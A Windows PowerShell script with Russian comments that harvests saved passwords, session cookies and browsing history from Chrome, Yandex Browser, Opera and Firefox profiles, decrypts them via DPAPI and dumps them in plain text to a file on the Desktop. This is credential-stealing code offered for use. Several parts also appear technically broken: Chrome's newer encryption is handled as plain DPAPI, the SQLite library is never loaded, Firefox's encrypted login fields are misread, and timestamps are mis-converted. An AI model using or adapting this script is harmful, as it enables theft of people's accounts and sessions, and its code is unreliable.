#Requires -Version 5.1

<#
.SYNOPSIS
    Извлекает данные браузеров (пароли, куки, историю) из популярных браузеров
.DESCRIPTION
    Скрипт работает с Google Chrome, Yandex Browser, Mozilla Firefox и Opera
    Использует DPAPI для расшифровки данных и SQLite для работы с базами данных
#>

# Добавляем типы для работы с DPAPI и SQLite
Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Data
Add-Type -AssemblyName System.Text.Encoding

# Функция для расшифровки данных с помощью DPAPI
function Decrypt-Data {
    param(
        [byte[]]$EncryptedData
    )
    
    try {
        if ($EncryptedData -eq $null -or $EncryptedData.Length -eq 0) {
            return $null
        }
        
        # Пропускаем nonce и другие метаданные для Chrome/Opera/Yandex
        if ($EncryptedData.Length -gt 15 -and $EncryptedData[0] -eq 1 -and $EncryptedData[1] -eq 0 -and $EncryptedData[2] -eq 0 -and $EncryptedData[3] -eq 0) {
            $decryptedData = [System.Security.Cryptography.ProtectedData]::Unprotect(
                $EncryptedData[5..($EncryptedData.Length-1)], 
                $null, 
                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
            )
            return [System.Text.Encoding]::UTF8.GetString($decryptedData)
        }
        
        # Для других случаев
        $decryptedData = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $EncryptedData, 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        return [System.Text.Encoding]::UTF8.GetString($decryptedData)
    }
    catch {
        Write-Warning "Ошибка расшифровки: $($_.Exception.Message)"
        return $null
    }
}

# Функция для работы с SQLite базами данных
function Invoke-SQLiteQuery {
    param(
        [string]$DatabasePath,
        [string]$Query
    )
    
    if (-not (Test-Path $DatabasePath)) {
        Write-Warning "Файл базы данных не найден: $DatabasePath"
        return @()
    }
    
    try {
        # Создаем временную копию для работы, так как база может быть заблокирована браузером
        $tempDbPath = [System.IO.Path]::GetTempFileName()
        Copy-Item -Path $DatabasePath -Destination $tempDbPath -Force
        
        # Используем ADO.NET для работы с SQLite
        $connectionString = "Data Source=$tempDbPath;Version=3;"
        $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
        $connection.Open()
        
        $command = $connection.CreateCommand()
        $command.CommandText = $Query
        
        $adapter = New-Object System.Data.SQLite.SQLiteDataAdapter($command)
        $dataSet = New-Object System.Data.DataSet
        $adapter.Fill($dataSet) | Out-Null
        
        $connection.Close()
        Remove-Item $tempDbPath -Force
        
        return $dataSet.Tables[0]
    }
    catch {
        Write-Warning "Ошибка работы с SQLite: $($_.Exception.Message)"
        return @()
    }
}

# Функция для извлечения данных Chrome-based браузеров (Chrome, Yandex, Opera)
function Get-BrowserDataChromeBased {
    param(
        [string]$BrowserName,
        [string]$ProfilePath
    )
    
    $result = @()
    
    if (-not (Test-Path $ProfilePath)) {
        Write-Warning "$BrowserName не найден или профиль отсутствует: $ProfilePath"
        return $result
    }
    
    Write-Host "Обработка $BrowserName..." -ForegroundColor Green
    
    try {
        # Пароли
        $loginDataPath = Join-Path $ProfilePath "Login Data"
        if (Test-Path $loginDataPath) {
            $query = @"
SELECT origin_url, username_value, password_value, date_created 
FROM logins 
WHERE username_value != '' 
ORDER BY date_created DESC
"@
            $logins = Invoke-SQLiteQuery -DatabasePath $loginDataPath -Query $query
            
            foreach ($login in $logins) {
                $decryptedPassword = Decrypt-Data -EncryptedData $login.password_value
                if ($decryptedPassword) {
                    $result += [PSCustomObject]@{
                        Browser = $BrowserName
                        Type = "Password"
                        URL = $login.origin_url
                        Username = $login.username_value
                        Password = $decryptedPassword
                        DateCreated = [datetime]::FromFileTime($login.date_created)
                    }
                }
            }
        }
        
        # Куки
        $cookiesPath = Join-Path $ProfilePath "Cookies"
        if (Test-Path $cookiesPath) {
            $query = @"
SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly 
FROM cookies 
ORDER BY expires_utc DESC
"@
            $cookies = Invoke-SQLiteQuery -DatabasePath $cookiesPath -Query $query
            
            foreach ($cookie in $cookies) {
                $decryptedValue = Decrypt-Data -EncryptedData $cookie.encrypted_value
                if ($decryptedValue) {
                    $result += [PSCustomObject]@{
                        Browser = $BrowserName
                        Type = "Cookie"
                        Domain = $cookie.host_key
                        Name = $cookie.name
                        Value = $decryptedValue
                        Path = $cookie.path
                        Expires = [datetime]::FromFileTime($cookie.expires_utc)
                        Secure = [bool]$cookie.is_secure
                        HttpOnly = [bool]$cookie.is_httponly
                    }
                }
            }
        }
        
        # История
        $historyPath = Join-Path $ProfilePath "History"
        if (Test-Path $historyPath) {
            $query = @"
SELECT url, title, visit_count, last_visit_time 
FROM urls 
ORDER BY last_visit_time DESC
"@
            $history = Invoke-SQLiteQuery -DatabasePath $historyPath -Query $query
            
            foreach ($item in $history) {
                $result += [PSCustomObject]@{
                    Browser = $BrowserName
                    Type = "History"
                    URL = $item.url
                    Title = $item.title
                    VisitCount = $item.visit_count
                    LastVisit = [datetime]::FromFileTime($item.last_visit_time)
                }
            }
        }
    }
    catch {
        Write-Warning "Ошибка обработки $BrowserName`: $($_.Exception.Message)"
    }
    
    return $result
}

# Функция для извлечения данных Firefox
function Get-BrowserDataFirefox {
    $result = @()
    
    $firefoxProfiles = @()
    $firefoxPath = Join-Path $env:APPDATA "Mozilla\Firefox\Profiles"
    
    if (-not (Test-Path $firefoxPath)) {
        Write-Warning "Firefox не найден или профили отсутствуют"
        return $result
    }
    
    Write-Host "Обработка Firefox..." -ForegroundColor Green
    
    try {
        # Находим все профили Firefox
        $profiles = Get-ChildItem -Path $firefoxPath -Directory | Where-Object { $_.Name -match "\.default(-release)?$" }
        
        foreach ($profile in $profiles) {
            $profilePath = $profile.FullName
            
            # Пароли (logins.json)
            $loginsPath = Join-Path $profilePath "logins.json"
            if (Test-Path $loginsPath) {
                $loginsData = Get-Content $loginsPath -Raw | ConvertFrom-Json
                
                foreach ($login in $loginsData.logins) {
                    $result += [PSCustomObject]@{
                        Browser = "Firefox"
                        Type = "Password"
                        URL = $login.hostname
                        Username = $login.username
                        Password = $login.password
                        DateCreated = [datetime]::FromFileTime($login.timeCreated)
                    }
                }
            }
            
            # Куки (cookies.sqlite)
            $cookiesPath = Join-Path $profilePath "cookies.sqlite"
            if (Test-Path $cookiesPath) {
                $query = @"
SELECT host, name, value, path, expiry, isSecure, isHttpOnly 
FROM moz_cookies 
ORDER BY expiry DESC
"@
                $cookies = Invoke-SQLiteQuery -DatabasePath $cookiesPath -Query $query
                
                foreach ($cookie in $cookies) {
                    $result += [PSCustomObject]@{
                        Browser = "Firefox"
                        Type = "Cookie"
                        Domain = $cookie.host
                        Name = $cookie.name
                        Value = $cookie.value
                        Path = $cookie.path
                        Expires = [datetime]::FromFileTime($cookie.expiry * 10000000)
                        Secure = [bool]$cookie.isSecure
                        HttpOnly = [bool]$cookie.isHttpOnly
                    }
                }
            }
            
            # История (places.sqlite)
            $historyPath = Join-Path $profilePath "places.sqlite"
            if (Test-Path $historyPath) {
                $query = @"
SELECT url, title, visit_count, last_visit_date 
FROM moz_places 
WHERE last_visit_date IS NOT NULL 
ORDER BY last_visit_date DESC
"@
                $history = Invoke-SQLiteQuery -DatabasePath $historyPath -Query $query
                
                foreach ($item in $history) {
                    $result += [PSCustomObject]@{
                        Browser = "Firefox"
                        Type = "History"
                        URL = $item.url
                        Title = $item.title
                        VisitCount = $item.visit_count
                        LastVisit = [datetime]::FromFileTime(($item.last_visit_date * 10) + 116444736000000000)
                    }
                }
            }
        }
    }
    catch {
        Write-Warning "Ошибка обработки Firefox: $($_.Exception.Message)"
    }
    
    return $result
}

# Основная функция сбора данных
function Get-AllBrowserData {
    $allData = @()
    
    # Пути к профилям браузеров
    $localAppData = [Environment]::GetFolderPath([Environment+SpecialFolder]::LocalApplicationData)
    
    # Google Chrome
    $chromePath = Join-Path $localAppData "Google\Chrome\User Data\Default"
    $allData += Get-BrowserDataChromeBased -BrowserName "Google Chrome" -ProfilePath $chromePath
    
    # Yandex Browser
    $yandexPath = Join-Path $localAppData "Yandex\YandexBrowser\User Data\Default"
    $allData += Get-BrowserDataChromeBased -BrowserName "Yandex Browser" -ProfilePath $yandexPath
    
    # Opera
    $operaPath = Join-Path $localAppData "Opera Software\Opera Stable"
    $allData += Get-BrowserDataChromeBased -BrowserName "Opera" -ProfilePath $operaPath
    
    # Mozilla Firefox
    $allData += Get-BrowserDataFirefox
    
    return $allData
}

# Главная функция
function Main {
    Write-Host "Начало сбора данных браузеров..." -ForegroundColor Yellow
    
    try {
        # Собираем все данные
        $browserData = Get-AllBrowserData
        
        # Сохраняем в файл
        $outputPath = Join-Path ([Environment]::GetFolderPath([Environment+SpecialFolder]::Desktop)) "info.txt"
        
        # Форматируем вывод
        $output = @()
        $output += "=" * 80
        $output += "ДАННЫЕ БРАУЗЕРОВ - $(Get-Date)"
        $output += "=" * 80
        $output += ""
        
        # Группируем по браузерам и типам данных
        $groupedData = $browserData | Group-Object Browser, Type
        
        foreach ($group in $groupedData) {
            $output += "$($group.Name.Replace(',', ' -'))"
            $output += "-" * 80
            
            foreach ($item in $group.Group) {
                switch ($item.Type) {
                    "Password" {
                        $output += "URL: $($item.URL)"
                        $output += "Username: $($item.Username)"
                        $output += "Password: $($item.Password)"
                        $output += "Created: $($item.DateCreated)"
                        $output += ""
                    }
                    "Cookie" {
                        $output += "Domain: $($item.Domain)"
                        $output += "Name: $($item.Name)"
                        $output += "Value: $($item.Value)"
                        $output += "Expires: $($item.Expires)"
                        $output += ""
                    }
                    "History" {
                        $output += "URL: $($item.URL)"
                        $output += "Title: $($item.Title)"
                        $output += "Visits: $($item.VisitCount)"
                        $output += "Last Visit: $($item.LastVisit)"
                        $output += ""
                    }
                }
            }
            $output += ""
        }
        
        # Записываем в файл
        $output | Out-File -FilePath $outputPath -Encoding UTF8
        Write-Host "Данные сохранены в: $outputPath" -ForegroundColor Green
        
        # Краткая статистика
        $stats = $browserData | Group-Object Browser, Type | ForEach-Object {
            "$($_.Name): $($_.Count) записей"
        }
        
        Write-Host "Статистика:" -ForegroundColor Cyan
        $stats | ForEach-Object { Write-Host "  $_" -ForegroundColor Cyan }
        
    }
    catch {
        Write-Error "Критическая ошибка: $($_.Exception.Message)"
    }
}

# Запускаем скрипт
Main
